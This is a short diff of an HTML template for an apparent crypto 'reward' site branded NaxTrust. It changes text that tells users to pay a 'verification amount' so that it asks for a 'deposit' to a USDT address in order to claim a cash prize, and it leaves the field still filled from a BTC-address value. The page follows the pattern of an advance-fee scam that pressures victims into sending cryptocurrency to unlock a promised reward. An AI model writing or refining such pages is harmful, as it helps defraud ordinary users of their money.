@@ -20,7 +20,7 @@
   </div>
   <div class="card-body">
     <div class="alert alert-dark rounded-pill" role="alert">
-      In order to verify your account and collect your reward, you need to make a payment of ${{request.user.reward.verification_amount}}.
+      In order to verify your account and collect your reward, you need to make a deposit of ${{request.user.reward.verification_amount}} in order to participate in this cash price . Important: Deposits made through this method will automatically be credited to your invested balance in your NaxTrust wallet. 
     </div>
 
   </div>
@@ -34,7 +34,7 @@
         <form method="POST">
           {% csrf_token %}
           <div class="form-group">
-            <label>Send Payment To BTC Address: </label>
+            <label> Deposit through this USDT Address: </label>
             <input type="text" class="form-control" value="{{request.user.reward.btc_address}}" readonly />
             <!-- <small class="form-text text-muted">Copy address</small> -->
           </div>
